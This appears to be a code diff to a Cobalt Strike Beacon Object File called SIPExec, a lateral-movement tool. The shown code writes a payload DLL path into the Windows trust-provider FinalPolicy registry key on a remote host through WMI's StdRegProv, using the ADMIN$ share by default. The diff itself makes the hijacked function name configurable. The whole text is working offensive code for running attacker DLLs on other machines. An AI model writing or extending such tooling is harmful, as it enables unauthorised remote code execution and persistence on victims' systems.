@@ -353,7 +353,8 @@ fail:
 }
 
 static BOOL hijack_finalpolicy(IWbemServices *pSvc, const char *guid,
-                                const char *payload_path, FP_BACKUP *backup) {
+                                const char *payload_path, const char *func_name,
+                                FP_BACKUP *backup) {
     char keyPath[512];
     MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);
 
@@ -368,7 +369,7 @@ static BOOL hijack_finalpolicy(IWbemServices *pSvc, const char *guid,
         TMB_ERR("StdRegProv.SetStringValue $DLL failed");
         return FALSE;
     }
-    stdreg_set_string(pSvc, keyPath, "$Function", "SoftpubAuthenticode");
+    stdreg_set_string(pSvc, keyPath, "$Function", func_name);
 
     TMB_INFO("FinalPolicy hijacked: $DLL -> %s", payload_path);
     return TRUE;
@@ -584,6 +585,7 @@ extern "C" void go(char *args, int alen) {
     char *dll_path_override = BeaconDataExtract(&parser, &tmp);
     char *share = BeaconDataExtract(&parser, &tmp);
     char *guid_alias = BeaconDataExtract(&parser, &tmp);
+    char *func_name = BeaconDataExtract(&parser, &tmp);
     short no_cleanup = BeaconDataShort(&parser);
 
     if (!target || !*target) {
@@ -598,6 +600,7 @@ extern "C" void go(char *args, int alen) {
 
     /* Defaults */
     if (!share || !*share) share = (char*)"ADMIN$";
+    if (!func_name || !*func_name) func_name = (char*)"SoftpubAuthenticode";
     const char *guid = resolve_guid(guid_alias);
 
     TMB_INFO("SIPExec %s -> %s (FinalPolicy: %s)",
@@ -648,7 +651,7 @@ extern "C" void go(char *args, int alen) {
 
     /* ---- Phase 2: Hijack FinalPolicy via StdRegProv ---- */
     FP_BACKUP backup = {0};
-    if (!hijack_finalpolicy(pSvcDefault, guid, target_local_path, &backup)) {
+    if (!hijack_finalpolicy(pSvcDefault, guid, target_local_path, func_name, &backup)) {
         pSvcDefault->Release();
         if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         OLE32$CoUninitialize();
